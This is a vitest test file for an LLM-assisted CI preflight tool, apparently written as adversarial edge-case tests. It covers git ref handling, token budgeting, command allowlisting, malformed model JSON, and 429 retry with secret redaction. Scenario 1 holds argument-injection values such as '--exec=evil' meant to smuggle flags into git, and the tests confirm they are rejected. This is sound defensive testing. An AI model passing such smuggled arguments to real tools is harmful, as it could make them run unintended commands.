import { execFileSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { afterEach, describe, expect, it, vi } from 'vitest';
import { runBench, type BenchCase, type BenchClientMeta } from '../src/bench/index.js';
import { formatCheckReport, runCheck, type CheckClientMeta } from '../src/check.js';
import { runCli, type CliIo } from '../src/cli.js';
import {
  computeRetryDelayMs,
  LlmHttpError,
  OpenAICompatibleClient,
  parseRetryAfterMs,
  SingleFlightQueue,
  type ChatCompletionRequest,
  type ChatCompletionResult,
  type FetchLike,
  type LlmClient,
} from '../src/clients/index.js';
import {
  ExplainValidationError,
  formatExplainReport,
  runExplain,
  type ExplainClientMeta,
  type ExplainOutput,
} from '../src/explain/index.js';
import {
  buildBudgetedContext,
  DEFAULT_MAX_INPUT_TOKENS,
  estimateTokens,
  findAffectedTestsAndNeighbors,
  gatherContext,
  GatherGitError,
  loadWorkflowCommands,
  resolveBaseRef,
  type BudgetContextParts,
} from '../src/gather/index.js';
import {
  runThink,
  ThinkValidationError,
  validateThinkOutput,
  type ThinkInput,
  type ThinkOutput,
} from '../src/think/index.js';
import { hasPathTraversal } from '../src/verify/allowlist.js';
import {
  checkCommandAllowlist,
  runVerify,
  type ExecuteCommandOptions,
  type ExecuteCommandResult,
  type VerifyWorkflowCommand,
} from '../src/verify/index.js';

const tempDirs: string[] = [];

function createTempDir(prefix = 'preflight-adversarial-'): string {
  const dir = mkdtempSync(join(tmpdir(), prefix));
  tempDirs.push(dir);
  return dir;
}

function writeRepoFile(root: string, relPath: string, content: string): void {
  const fullPath = join(root, relPath);
  mkdirSync(dirname(fullPath), { recursive: true });
  writeFileSync(fullPath, content, 'utf8');
}

function runGit(cwd: string, args: string[]): string {
  return execFileSync('git', args, {
    cwd,
    encoding: 'utf8',
    stdio: ['ignore', 'pipe', 'pipe'],
  });
}

function initCommittedGitRepo(options?: {
  branch?: string;
  workflowYaml?: string;
  files?: Record<string, string>;
}): string {
  const repoDir = createTempDir('preflight-adv-git-');
  const branch = options?.branch ?? 'main';

  runGit(repoDir, ['init']);
  runGit(repoDir, ['checkout', '-B', branch]);

  if (options?.workflowYaml !== undefined) {
    writeRepoFile(repoDir, '.github/workflows/ci.yml', options.workflowYaml);
  }

  const files = options?.files ?? {
    'src/math.ts': 'export const add = (a: number, b: number) => a + b;\n',
    'test/math.test.ts':
      "import { add } from '../src/math.js';\nif (add(1, 2) !== 3) process.exit(1);\n",
  };

  for (const [relPath, content] of Object.entries(files)) {
    writeRepoFile(repoDir, relPath, content);
  }

  runGit(repoDir, ['add', '.']);
  runGit(repoDir, [
    '-c',
    'user.name=Adversarial Breaker',
    '-c',
    'user.email=breaker@example.com',
    '-c',
    'commit.gpgsign=false',
    'commit',
    '-m',
    'initial commit',
  ]);

  return repoDir;
}

function createCapturedIo(): {
  io: CliIo;
  stdout: string[];
  stderr: string[];
} {
  const stdout: string[] = [];
  const stderr: string[] = [];
  return {
    stdout,
    stderr,
    io: {
      stdout: (line: string) => stdout.push(line),
      stderr: (line: string) => stderr.push(line),
    },
  };
}

function makeCompletionResult(content: string | null, omitChoices = false): ChatCompletionResult {
  return {
    raw: omitChoices
      ? { id: 'chatcmpl-empty', choices: [] }
      : {
          id: 'chatcmpl-adv',
          model: 'qwen2.5-coder:7b',
          choices: [
            {
              index: 0,
              message: { role: 'assistant', content },
              finish_reason: 'stop',
            },
          ],
          usage: { prompt_tokens: 200, completion_tokens: 60, total_tokens: 260 },
          time_info: {
            queue_time: 0.001,
            prompt_time: 0.01,
            completion_time: 0.03,
            total_time: 0.041,
          },
        },
    usage: { prompt_tokens: 200, completion_tokens: 60, total_tokens: 260 },
    time_info: {
      queue_time: 0.001,
      prompt_time: 0.01,
      completion_time: 0.03,
      total_time: 0.041,
    },
    wallTimeMs: 45,
    status: 200,
  };
}

function createQueueClient(
  responses: readonly (string | null | Error | { omitChoices: true })[],
): { client: LlmClient; calls: ChatCompletionRequest[] } {
  const calls: ChatCompletionRequest[] = [];
  let index = 0;

  const client: LlmClient = {
    provider: 'ollama',
    baseUrl: 'http://localhost:11434/v1',
    model: 'qwen2.5-coder:7b',
    chatCompletion(request: ChatCompletionRequest): Promise<ChatCompletionResult> {
      calls.push(request);
      const item = responses[index];
      index += 1;
      if (item === undefined) {
        return Promise.reject(new Error(`Unexpected LLM call #${index}`));
      }
      if (item instanceof Error) {
        return Promise.reject(item);
      }
      if (typeof item === 'object' && item !== null && 'omitChoices' in item) {
        return Promise.resolve(makeCompletionResult(null, true));
      }
      return Promise.resolve(makeCompletionResult(item));
    },
  };

  return { client, calls };
}

const DEFAULT_META: CheckClientMeta & ExplainClientMeta & BenchClientMeta = {
  provider: 'ollama',
  model: 'qwen2.5-coder:7b',
  baseUrl: 'http://localhost:11434/v1',
};

function wf(
  command: string,
  extra?: Partial<Omit<VerifyWorkflowCommand, 'command'>>,
): VerifyWorkflowCommand {
  return {
    file: extra?.file ?? '.github/workflows/ci.yml',
    job: extra?.job ?? 'verify',
    command,
    ...(extra?.workingDirectory !== undefined
      ? { workingDirectory: extra.workingDirectory }
      : {}),
  };
}

afterEach(() => {
  while (tempDirs.length > 0) {
    const dir = tempDirs.pop();
    if (dir !== undefined) {
      rmSync(dir, { recursive: true, force: true });
    }
  }
});

// ============================================================================
// SCENARIO 1: WRONG BASE BRANCH
// ============================================================================
describe('Scenario 1: Wrong base branch & git ref edge cases', () => {
  it('fails cleanly with exit 1 and zero LLM calls when --base does-not-exist-branch is passed', async () => {
    const repoDir = initCommittedGitRepo();
    writeRepoFile(repoDir, 'src/math.ts', 'export const add = (a: number, b: number) => a + b + 1;\n');

    expect(() =>
      gatherContext({ cwd: repoDir, baseRef: 'does-not-exist-branch' }),
    ).toThrow(GatherGitError);

    const mock = createQueueClient([]);
    await expect(
      runCheck({ cwd: repoDir, baseRef: 'does-not-exist-branch' }, mock.client, DEFAULT_META),
    ).rejects.toThrow(/Invalid base ref "does-not-exist-branch"/);
    expect(mock.calls).toHaveLength(0);

    const captured = createCapturedIo();
    const exitCode = await runCli(
      ['check', '--base', 'does-not-exist-branch'],
      captured.io,
      {
        cwd: repoDir,
        env: {},
        createClient: () => mock.client,
      },
    );

    expect(exitCode).toBe(1);
    expect(mock.calls).toHaveLength(0);
    expect(captured.stdout).toEqual([]);
    expect(captured.stderr.join('\n')).toMatch(/Error:.*does-not-exist-branch/);
  });

  it('rejects flag-injection base refs (--exec=evil, -n, whitespace) without invoking git or the LLM', async () => {
    const repoDir = initCommittedGitRepo();

    for (const badRef of ['--exec=evil', '-q', '--all', '   ', '']) {
      expect(() => resolveBaseRef(repoDir, badRef)).toThrow(GatherGitError);
    }

    const mock = createQueueClient([]);
    for (const argv of [
      ['check', '--base', '--exec=evil'],
      ['check', '--base=--exec=evil'],
      ['check', '--base=-n'],
      ['check', '--base', '   '],
    ]) {
      const captured = createCapturedIo();
      const code = await runCli(argv, captured.io, {
        cwd: repoDir,
        env: {},
        createClient: () => mock.client,
      });
      expect(code).toBe(1);
      expect(mock.calls).toHaveLength(0);
      expect(captured.stderr.length).toBeGreaterThan(0);
    }
  });

  it('handles unborn git repo with zero commits + untracked file cleanly with exit 1 and 0 LLM calls', async () => {
    const unbornDir = createTempDir('preflight-adv-unborn-');
    runGit(unbornDir, ['init']);
    writeRepoFile(unbornDir, 'src/untracked.ts', 'export const x = 1;\n');

    expect(() => gatherContext({ cwd: unbornDir })).toThrow(GatherGitError);

    const mock = createQueueClient([]);
    const captured = createCapturedIo();
    const code = await runCli(['check'], captured.io, {
      cwd: unbornDir,
      env: {},
      createClient: () => mock.client,
    });

    expect(code).toBe(1);
    expect(mock.calls).toHaveLength(0);
    expect(captured.stderr.join('\n')).toContain('Error:');
  });

  it('handles detached HEAD and explicit refs/heads/main cleanly, and rejects deep out-of-range HEAD~999', () => {
    const repoDir = initCommittedGitRepo({ branch: 'feature-branch' });
    const headSha = runGit(repoDir, ['rev-parse', 'HEAD']).trim();
    runGit(repoDir, ['checkout', '--detach', headSha]);
    runGit(repoDir, ['branch', '-D', 'feature-branch']);

    writeRepoFile(repoDir, 'src/math.ts', 'export const add = (a: number, b: number) => a * b;\n');

    const detachedGathered = gatherContext({ cwd: repoDir });
    expect(detachedGathered.baseRef).toBe('HEAD');
    expect(detachedGathered.changedFiles).toContain('src/math.ts');

    expect(() => gatherContext({ cwd: repoDir, baseRef: 'HEAD~999' })).toThrow(
      GatherGitError,
    );
  });

  it('[BUG 1A] collects git diff cleanly even when a file or directory in the working tree has the same name as baseRef', () => {
    // In real repos, branches like "test", "docs", "src", or "main" frequently collide
    // with a directory or file of the same name in the working tree.
    // Without `--` in `git diff <baseRef> --`, git fails with:
    // `fatal: ambiguous argument '<baseRef>': both revision and filename`
    const repoDir = initCommittedGitRepo({ branch: 'test' });
    writeRepoFile(repoDir, 'src/math.ts', 'export const add = (a: number, b: number) => a + b + 10;\n');

    const gathered = gatherContext({ cwd: repoDir, baseRef: 'test' });
    expect(gathered.baseRef).toBe('test');
    expect(gathered.changedFiles).toContain('src/math.ts');
  });

  it('[BUG 1B] rejects non-commit blob object refs (e.g. HEAD:src/math.ts) in resolveBaseRef', () => {
    const repoDir = initCommittedGitRepo();

    // `HEAD:src/math.ts` is a blob object, not a commit-ish!
    // `resolveBaseRef` must verify `^{commit}` rather than accepting arbitrary blob objects.
    expect(() => resolveBaseRef(repoDir, 'HEAD:src/math.ts')).toThrow(GatherGitError);
  });
});

// ============================================================================
// SCENARIO 2: HUGE DIFF
// ============================================================================
describe('Scenario 2: Huge diff (> 120,000 tokens), tier trimming, and import graph stress', () => {
  it('strictly enforces estimatedTokens <= maxInputTokens for 125,000-token diffs at 20,000 and 200 token budgets', () => {
    // ~520 KB diff => > 130,000 tokens
    const hugeDiff = `diff --git a/src/huge.ts b/src/huge.ts\n--- a/src/huge.ts\n+++ b/src/huge.ts\n@@ -1,1 +1,5000 @@\n+${'const x = "huge_line_payload_0123456789";\n'.repeat(13_000)}`;
    expect(estimateTokens(hugeDiff)).toBeGreaterThan(120_000);

    const parts: BudgetContextParts = {
      baseRef: 'main',
      diff: hugeDiff,
      changedFiles: ['src/huge.ts'],
      workflowCommands: [
        { file: '.github/workflows/ci.yml', job: 'test', command: 'npm test' },
        { file: '.github/workflows/ci.yml', job: 'lint', command: 'npm run lint' },
      ],
      affectedTests: [
        { path: 'test/huge.test.ts', content: 't'.repeat(120_000) },
      ],
      changedFileContents: [
        { path: 'src/huge.ts', content: 'c'.repeat(120_000) },
      ],
      neighborContents: [
        { path: 'src/neighbor.ts', content: 'n'.repeat(120_000) },
      ],
    };

    for (const budget of [DEFAULT_MAX_INPUT_TOKENS, 200, 10, 1, 0]) {
      const res = buildBudgetedContext(parts, budget);
      expect(res.estimatedTokens).toBeLessThanOrEqual(budget);
      expect(estimateTokens(res.budgetedContext)).toBeLessThanOrEqual(budget);
    }
  });

  it('[BUG 2A] preserves recent_ci_log tail and ci_commands in budgetedContext even when git diff exceeds 120,000 tokens', () => {
    const hugeDiff = `diff --git a/src/huge.ts b/src/huge.ts\n+${'D'.repeat(500_000)}`;
    expect(estimateTokens(hugeDiff)).toBeGreaterThan(120_000);

    const parts: BudgetContextParts = {
      baseRef: 'main',
      diff: hugeDiff,
      changedFiles: ['src/huge.ts'],
      workflowCommands: [
        { file: '.github/workflows/ci.yml', job: 'test', command: 'npm test' },
      ],
      affectedTests: [
        { path: 'test/huge.test.ts', content: 'T'.repeat(80_000) },
      ],
      changedFileContents: [
        { path: 'src/huge.ts', content: 'C'.repeat(80_000) },
      ],
      neighborContents: [
        { path: 'src/neighbor.ts', content: 'N'.repeat(80_000) },
      ],
      recentCiLog: `${'log line\n'.repeat(1000)}CRITICAL_CI_FAILURE_TAIL_SENTINEL`,
    };

    const budgeted = buildBudgetedContext(parts, DEFAULT_MAX_INPUT_TOKENS);
    expect(budgeted.estimatedTokens).toBeLessThanOrEqual(DEFAULT_MAX_INPUT_TOKENS);
    // Even when the diff is > 120k tokens, a 20k-token budget MUST NOT let git_diff
    // consume 100% of the budget and starve out recent_ci_log or ci_commands!
    expect(budgeted.budgetedContext).toContain('CRITICAL_CI_FAILURE_TAIL_SENTINEL');
    expect(budgeted.budgetedContext).toContain('npm test');
  });

  it('[BUG 2B] caps the Changed files list in formatGitDiffSection so thousands of changed file paths do not crowd out the diff body', () => {
    const manyChangedFiles = Array.from(
      { length: 2_500 },
      (_, idx) => `packages/module-${idx}/src/components/deeply/nested/file-${idx}.ts`,
    );
    const diffBody = 'diff --git a/src/important.ts b/src/important.ts\n+IMPORTANT_DIFF_HUNK_SENTINEL';

    const budgeted = buildBudgetedContext(
      {
        baseRef: 'main',
        diff: diffBody,
        changedFiles: manyChangedFiles,
        workflowCommands: [{ file: '.github/workflows/ci.yml', job: 'test', command: 'npm test' }],
        affectedTests: [],
        changedFileContents: [],
        neighborContents: [],
      },
      DEFAULT_MAX_INPUT_TOKENS,
    );

    expect(budgeted.estimatedTokens).toBeLessThanOrEqual(DEFAULT_MAX_INPUT_TOKENS);
    expect(budgeted.budgetedContext).toContain('IMPORTANT_DIFF_HUNK_SENTINEL');
  });

  it('handles circular imports and oversized (>512 KB) files without hanging or crashing', () => {
    const dir = createTempDir('preflight-adv-graph-');

    // Circular JS/TS import cycle: a.ts <-> b.ts <-> c.ts <- test/cycle.test.ts
    writeRepoFile(dir, 'src/a.ts', "import { b } from './b.js';\nexport const a = () => b();\n");
    writeRepoFile(dir, 'src/b.ts', "import { c } from './c.js';\nexport const b = () => c();\n");
    writeRepoFile(dir, 'src/c.ts', "import { a } from './a.js';\nexport const c = () => a();\n");
    writeRepoFile(
      dir,
      'test/cycle.test.ts',
      "import { a } from '../src/a.js';\nexport const run = a;\n",
    );
    // Oversized > 512 KB file should be safely skipped by readFileContentSafe
    writeRepoFile(dir, 'src/giant.min.js', `export const big = "${'x'.repeat(600 * 1024)}";\n`);

    const result = findAffectedTestsAndNeighbors(dir, ['src/c.ts']);
    expect(result.affectedTests.map((t) => t.path)).toEqual(['test/cycle.test.ts']);
  });

  it('[BUG 2C] extracts imports after template literals containing /* or // in import-graph.ts', () => {
    const dir = createTempDir('preflight-adv-template-comment-');

    writeRepoFile(dir, 'src/target.ts', 'export const target = 1;\n');
    // `stripJsComments` does not track backtick template literals (`...`), so `/*` inside
    // a template literal turns on `inBlockComment` for the rest of the file and erases imports!
    writeRepoFile(
      dir,
      'test/glob.test.ts',
      [
        'const pattern = `packages/*`;',
        "import { target } from '../src/target.js';",
        'export const check = target;',
      ].join('\n'),
    );

    const { affectedTests } = findAffectedTestsAndNeighbors(dir, ['src/target.ts']);
    expect(affectedTests.map((t) => t.path)).toEqual(['test/glob.test.ts']);
  });
});

// ============================================================================
// SCENARIO 3: NO CI FILE
// ============================================================================
describe('Scenario 3: No CI workflow file / empty workflows / action-only workflows', () => {
  it('returns empty workflowCommands for missing dir, comment-only YAML, and action-only YAML', () => {
    const noDir = createTempDir('preflight-adv-noci-1-');
    expect(loadWorkflowCommands(noDir)).toEqual([]);

    const commentOnlyDir = createTempDir('preflight-adv-noci-2-');
    writeRepoFile(
      commentOnlyDir,
      '.github/workflows/ci.yml',
      '# Comment-only workflow\n   \n---\n# Nothing here\n',
    );
    expect(loadWorkflowCommands(commentOnlyDir)).toEqual([]);

    const actionOnlyDir = createTempDir('preflight-adv-noci-3-');
    writeRepoFile(
      actionOnlyDir,
      '.github/workflows/ci.yml',
      [
        'name: Action Only',
        'on: [push]',
        'jobs:',
        '  build:',
        '    runs-on: ubuntu-latest',
        '    steps:',
        '      - uses: actions/checkout@v4',
        '      - name: Setup Node',
        '        uses: actions/setup-node@v4',
        '        with:',
        '          node-version: 22',
      ].join('\n'),
    );
    expect(loadWorkflowCommands(actionOnlyDir)).toEqual([]);
  });

  it('fails closed in runCheck and runCli(["check"]) with no_checks_run, 0 spawned commands, and never claims "CI will pass"', async () => {
    const repoDir = initCommittedGitRepo();
    writeRepoFile(repoDir, 'src/math.ts', 'export const add = (a: number, b: number) => a + b + 1;\n');

    const thinkOutput: ThinkOutput = {
      likely_failures: [
        {
          category: 'test',
          target: 'test/math.test.ts',
          reason: 'Modified add() implementation',
        },
      ],
      affected_jobs: ['test'],
      commands: ['npm test', 'npx vitest run test/math.test.ts'],
      notes: 'Attempted to run tests even though repo has no CI workflow file.',
    };

    const mock = createQueueClient([JSON.stringify(thinkOutput)]);
    const spawnCommand = vi.fn(
      async (): Promise<ExecuteCommandResult> => {
        throw new Error('spawnCommand must never be called when no CI workflow exists');
      },
    );

    const report = await runCheck(
      { cwd: repoDir, spawnCommand },
      mock.client,
      DEFAULT_META,
    );

    expect(spawnCommand).not.toHaveBeenCalled();
    expect(report.gather.workflowCommandCount).toBe(0);
    expect(report.verdict).toBe('no_checks_run');
    expect(report.verdictMessage).toBe('no allowlisted checks were executed');
    expect(report.verify.refusedCommands).toHaveLength(2);
    expect(report.verify.results.every((r) => r.status === 'refused')).toBe(true);

    const formatted = formatCheckReport(report);
    expect(formatted).toContain('Verdict: no allowlisted checks were executed');
    expect(formatted.toLowerCase()).not.toContain('ci will pass');

    // Also test via runCli(['check'])
    const cliMock = createQueueClient([JSON.stringify(thinkOutput)]);
    const captured = createCapturedIo();
    const exitCode = await runCli(['check'], captured.io, {
      cwd: repoDir,
      env: {},
      createClient: () => cliMock.client,
    });
    expect(exitCode).toBe(0);
    expect(captured.stdout.join('\n')).toContain('Verdict: no allowlisted checks were executed');
    expect(captured.stdout.join('\n').toLowerCase()).not.toContain('ci will pass');
  });

  it('[BUG 3A] fails closed in runExplain by refusing model-suggested failing_command via runVerify when repo has no CI workflow file', async () => {
    const repoDir = initCommittedGitRepo(); // No .github/workflows/ci.yml
    writeRepoFile(repoDir, 'ci.log', 'FAIL test/math.test.ts\nAssertionError: expected 3 to equal 4\n');

    const explainPayload: ExplainOutput = {
      root_cause: 'off-by-one in src/math.ts',
      failing_command: 'npm test',
      suggested_patch: '--- a/src/math.ts\n+++ b/src/math.ts\n-a + b + 1\n+a + b',
      explanation: 'Remove + 1 from add().',
    };

    const mock = createQueueClient([JSON.stringify(explainPayload)]);
    const spawnCommand = vi.fn(
      async (): Promise<ExecuteCommandResult> => {
        throw new Error('spawnCommand must never run unallowlisted commands');
      },
    );

    const result = await runExplain(
      {
        source: 'ci.log',
        cwd: repoDir,
        spawnCommand,
      },
      mock.client,
      DEFAULT_META,
    );

    expect(spawnCommand).not.toHaveBeenCalled();
    // When verify is enabled (default) and the model suggests a non-null failing_command,
    // runExplain must call runVerify so it fails closed with verdict 'no_checks_run'
    // and records the refused command rather than silently returning verification: null ("skipped").
    expect(result.verification).not.toBeNull();
    expect(result.verification?.verdict).toBe('no_checks_run');
    expect(result.verification?.verdictMessage).toBe('no allowlisted checks were executed');
    expect(result.verification?.refusedCommands).toHaveLength(1);
    expect(result.verification?.refusedCommands[0]?.command).toBe('npm test');

    const formatted = formatExplainReport(result);
    expect(formatted.toLowerCase()).not.toContain('ci will pass');
  });
});

// ============================================================================
// SCENARIO 4: FLAKY TEST
// ============================================================================
describe('Scenario 4: Flaky test (intermittent failure & timeout handling)', () => {
  it('reports failed (exit 1) without retrying when a real allowlisted subprocess fails on its first run', async () => {
    const flakyScript = [
      "import { existsSync, writeFileSync } from 'node:fs';",
      "if (!existsSync('.flaky-ran-once')) {",
      "  writeFileSync('.flaky-ran-once', '1', 'utf8');",
      "  process.stderr.write('Flaky failure on attempt 1\\n');",
      '  process.exit(1);',
      '}',
      "process.stdout.write('Passed on attempt 2\\n');",
      'process.exit(0);',
    ].join('\n');

    const repoDir = initCommittedGitRepo({
      workflowYaml: [
        'name: CI',
        'jobs:',
        '  test:',
        '    runs-on: ubuntu-latest',
        '    steps:',
        '      - run: node --test',
      ].join('\n'),
      files: {
        'src/math.ts': 'export const add = (a: number, b: number) => a + b;\n',
        'test/flaky.test.mjs': flakyScript,
      },
    });

    // Modify src/math.ts so runCheck does not short-circuit
    writeRepoFile(repoDir, 'src/math.ts', 'export const add = (a: number, b: number) => a + b + 1;\n');

    const thinkOutput: ThinkOutput = {
      likely_failures: [
        {
          category: 'test',
          target: 'test/flaky.test.mjs',
          reason: 'Flaky test target',
        },
      ],
      affected_jobs: ['test'],
      commands: ['node --test test/flaky.test.mjs'],
      notes: 'Run flaky test once.',
    };

    const mock = createQueueClient([JSON.stringify(thinkOutput)]);
    const captured = createCapturedIo();

    const exitCode = await runCli(['check'], captured.io, {
      cwd: repoDir,
      env: {},
      createClient: () => mock.client,
    });

    const out = captured.stdout.join('\n');
    expect(exitCode).toBe(1);
    expect(out).toContain('Verdict: these checks failed');
    expect(out).not.toContain('these checks passed');
    expect(out.toLowerCase()).not.toContain('ci will pass');
  });

  it('[BUG 4A] deduplicates identical candidate commands in runVerify so a flaky test is not executed twice when the LLM repeats a command', async () => {
    let executions = 0;
    const spawnCommand = vi.fn(
      async (
        _binary: string,
        _args: readonly string[],
        _options: ExecuteCommandOptions,
      ): Promise<ExecuteCommandResult> => {
        executions += 1;
        // Flaky test: passes on run 1, fails on run 2 (or vice versa)
        return {
          status: executions === 1 ? 'failed' : 'passed',
          exitCode: executions === 1 ? 1 : 0,
          durationMs: 10,
          stdout: '',
          stderr: executions === 1 ? 'fail on run 1' : '',
        };
      },
    );

    const verifyResult = await runVerify(
      ['npm test', 'npm test'],
      [wf('npm test')],
      { cwd: '/repo', spawnCommand },
    );

    expect(verifyResult.verdict).toBe('failed');
    expect(verifyResult.verdictMessage).toBe('these checks failed');
    // Identical commands in the same runVerify pass should be executed at most once!
    expect(spawnCommand).toHaveBeenCalledTimes(1);
  });
});

// ============================================================================
// SCENARIO 5: MALFORMED LLM JSON
// ============================================================================
describe('Scenario 5: Malformed LLM JSON across Think, Explain, Check, Bench, and CLI', () => {
  const SAMPLE_THINK_INPUT: ThinkInput = {
    budgetedContext: '## Git Diff\n+const x = 1;',
    workflowCommands: [{ file: '.github/workflows/ci.yml', job: 'test', command: 'npm test' }],
    changedFiles: ['src/index.ts'],
  };

  it.each([
    ['truncated JSON', '{"likely_failures": ['],
    ['pure prose with braces', 'Analysis complete for {src/index.ts}: no issues found in {main}.'],
    ['empty string', ''],
    ['whitespace only', '   \n\t  '],
    ['JSON array', '[1, 2, 3]'],
    ['JSON null', 'null'],
    ['commands as array of objects', JSON.stringify({
      likely_failures: [],
      affected_jobs: ['test'],
      commands: [{ cmd: 'npm test' }],
      notes: 'bad command object',
    })],
    ['deeply nested garbage types', JSON.stringify({
      likely_failures: [{ category: 123, target: null, reason: {}, line: -5, confidence: 2.5 }],
      affected_jobs: [null, ''],
      commands: ['   '],
      notes: ['not-a-string'],
    })],
  ])('rejects %s in validateThinkOutput and limits runThink to strictly 2 LLM calls', async (_label, payload) => {
    const validation = validateThinkOutput(payload);
    expect(validation.ok).toBe(false);

    const mock = createQueueClient([
      payload,
      payload,
      // 3rd entry must never be called
      JSON.stringify({
        likely_failures: [],
        affected_jobs: [],
        commands: [],
        notes: 'should never reach attempt 3',
      }),
    ]);

    await expect(runThink(SAMPLE_THINK_INPUT, mock.client)).rejects.toThrow(
      ThinkValidationError,
    );
    expect(mock.calls).toHaveLength(2);
  });

  it('handles choices: [] in both runThink and runExplain with strictly 2 LLM calls', async () => {
    const thinkMock = createQueueClient([{ omitChoices: true }, { omitChoices: true }]);
    await expect(runThink(SAMPLE_THINK_INPUT, thinkMock.client)).rejects.toThrow(
      ThinkValidationError,
    );
    expect(thinkMock.calls).toHaveLength(2);

    const explainDir = createTempDir('preflight-adv-explain-choices-');
    writeRepoFile(explainDir, 'ci.log', 'FAIL test/a.test.ts\n');
    const explainMock = createQueueClient([{ omitChoices: true }, { omitChoices: true }]);

    await expect(
      runExplain(
        {
          source: 'ci.log',
          cwd: explainDir,
          verify: false,
          gitExec: () => '',
        },
        explainMock.client,
        DEFAULT_META,
      ),
    ).rejects.toThrow(ExplainValidationError);
    expect(explainMock.calls).toHaveLength(2);
  });

  it('exits 1 in runCli without leaking secrets when LLM returns malformed JSON echoing an API key, and continues subsequent cases in runBench', async () => {
    const repoDir = initCommittedGitRepo({
      workflowYaml: 'jobs:\n  test:\n    steps:\n      - run: npm test\n',
    });
    writeRepoFile(repoDir, 'src/math.ts', 'export const add = (a: number, b: number) => a + b + 1;\n');

    const secretKey = 'sk-supersecretkey9876543210abcdef';
    const badRaw = `{"broken_json_echoing_key": "${secretKey}"`;
    const cliMock = createQueueClient([badRaw, badRaw]);
    const captured = createCapturedIo();

    const code = await runCli(['check'], captured.io, {
      cwd: repoDir,
      env: { PREFLIGHT_API_KEY: secretKey },
      createClient: () => cliMock.client,
    });

    expect(code).toBe(1);
    expect(cliMock.calls).toHaveLength(2);
    const stderrText = captured.stderr.join('\n');
    expect(stderrText).toContain('Error:');
    expect(stderrText).not.toContain(secretKey);

    // Verify runBench records error on case 1 (after 2 attempts) and still completes case 2
    const casesDir = createTempDir('preflight-adv-bench-malformed-');
    const case1: BenchCase = {
      id: 'fail-01-malformed',
      status: 'fail',
      repo: 'expressjs/express',
      pr: 101,
      pr_url: 'https://github.com/expressjs/express/pull/101',
      language: 'javascript',
      base_sha: '1111111111111111111111111111111111111111',
      head_sha: '2222222222222222222222222222222222222222',
      workflow_file: '.github/workflows/ci.yml',
      run_id: 12345,
      run_url: 'https://github.com/expressjs/express/actions/runs/12345',
      failing_job: 'test',
      failing_command: 'npm test',
      log_excerpt: 'Error in test',
      changed_files: ['lib/application.js'],
      root_cause_label: 'unit_test: lib/application.js',
      label_verified: {
        checked_against_log: true,
        checked_against_diff: true,
        notes: 'verified',
      },
    };
    const case2: BenchCase = {
      ...case1,
      id: 'pass-02-valid',
      status: 'pass',
      pr: 102,
      failing_job: null,
      failing_command: null,
      log_excerpt: null,
    };

    writeRepoFile(casesDir, '01.json', JSON.stringify(case1));
    writeRepoFile(casesDir, '02.json', JSON.stringify(case2));

    const validSecondCase: ThinkOutput = {
      likely_failures: [],
      affected_jobs: ['test'],
      commands: ['npm test'],
      notes: 'Clean pass case.',
    };
    const benchMock = createQueueClient([
      '{"truncated": [',
      '{"still_truncated": [',
      JSON.stringify(validSecondCase),
    ]);

    const benchReport = await runBench(
      { cwd: repoDir, casesDir },
      benchMock.client,
      DEFAULT_META,
    );

    expect(benchMock.calls).toHaveLength(3);
    expect(benchReport.metrics.totalCases).toBe(2);
    expect(benchReport.metrics.errors).toBe(1);
    expect(benchReport.cases[0]?.thinkAttempts).toBe(2);
    expect(benchReport.cases[0]?.error).toMatch(/failed validation after 2 attempts/);
    expect(benchReport.cases[1]?.error).toBeNull();
    expect(benchReport.cases[1]?.falseAlarm).toBe(false);
  });
});

// ============================================================================
// SCENARIO 6: HTTP 429 RATE LIMITING
// ============================================================================
describe('Scenario 6: HTTP 429 retry, Retry-After parsing, secret redaction, and queue recovery', () => {
  it('bounds huge Retry-After values by maxDelayMs and recovers on transient 429s', async () => {
    const sleepDelays: number[] = [];
    let fetchCalls = 0;

    const mockFetch: FetchLike = async () => {
      fetchCalls += 1;
      if (fetchCalls === 1) {
        return new Response('rate limit 0', {
          status: 429,
          headers: { 'Retry-After': '0' },
        });
      }
      if (fetchCalls === 2) {
        // Malicious/broken server sending 24-hour Retry-After: 86400
        return new Response('rate limit huge', {
          status: 429,
          headers: { 'Retry-After': '86400' },
        });
      }
      return new Response(
        JSON.stringify({
          id: 'chatcmpl-ok',
          choices: [{ index: 0, message: { role: 'assistant', content: '{"ok":true}' } }],
        }),
        { status: 200, headers: { 'Content-Type': 'application/json' } },
      );
    };

    const client = new OpenAICompatibleClient({
      provider: 'ollama',
      fetch: mockFetch,
      maxRetries: 3,
      baseDelayMs: 100,
      maxDelayMs: 2_500,
      sleep: async (ms: number) => {
        sleepDelays.push(ms);
      },
      singleFlightQueue: new SingleFlightQueue(),
    });

    const res = await client.chatCompletion({
      messages: [{ role: 'user', content: 'ping' }],
    });

    expect(res.status).toBe(200);
    expect(fetchCalls).toBe(3);
    // First retry: Retry-After: 0 -> 0ms; Second retry: Retry-After: 86400 -> bounded to maxDelayMs (2500ms)
    expect(sleepDelays).toEqual([0, 2_500]);
  });

  it('exhausts persistent 429s after maxRetries + 1 calls, redacts echoed API key, and does not deadlock SingleFlightQueue', async () => {
    const queue = new SingleFlightQueue();
    const secretApiKey = 'gsk_live_secret_token_1234567890abcdef';
    let callCount = 0;

    const mockFetch: FetchLike = async () => {
      callCount += 1;
      if (callCount <= 3) {
        return new Response(`Rate limit exceeded for key ${secretApiKey}`, {
          status: 429,
          headers: { 'Retry-After': '1' },
        });
      }
      return new Response(
        JSON.stringify({
          id: 'chatcmpl-recovered',
          choices: [{ index: 0, message: { role: 'assistant', content: 'recovered' } }],
        }),
        { status: 200 },
      );
    };

    const client = new OpenAICompatibleClient({
      provider: 'groq',
      apiKey: secretApiKey,
      fetch: mockFetch,
      maxRetries: 2,
      baseDelayMs: 10,
      maxDelayMs: 50,
      sleep: async () => undefined,
      singleFlightQueue: queue,
    });

    let caughtError: unknown;
    try {
      await client.chatCompletion({
        messages: [{ role: 'user', content: 'first request' }],
      });
    } catch (err: unknown) {
      caughtError = err;
    }

    expect(callCount).toBe(3); // initial + 2 retries
    expect(caughtError).toBeInstanceOf(LlmHttpError);
    const httpErr = caughtError as LlmHttpError;
    expect(httpErr.status).toBe(429);
    expect(httpErr.message).not.toContain(secretApiKey);
    expect(httpErr.message).toContain('[REDACTED]');

    // Subsequent request on the same SingleFlightQueue must not deadlock
    const secondResult = await client.chatCompletion({
      messages: [{ role: 'user', content: 'second request after 429' }],
    });
    expect(secondResult.status).toBe(200);
    expect(callCount).toBe(4);
  });

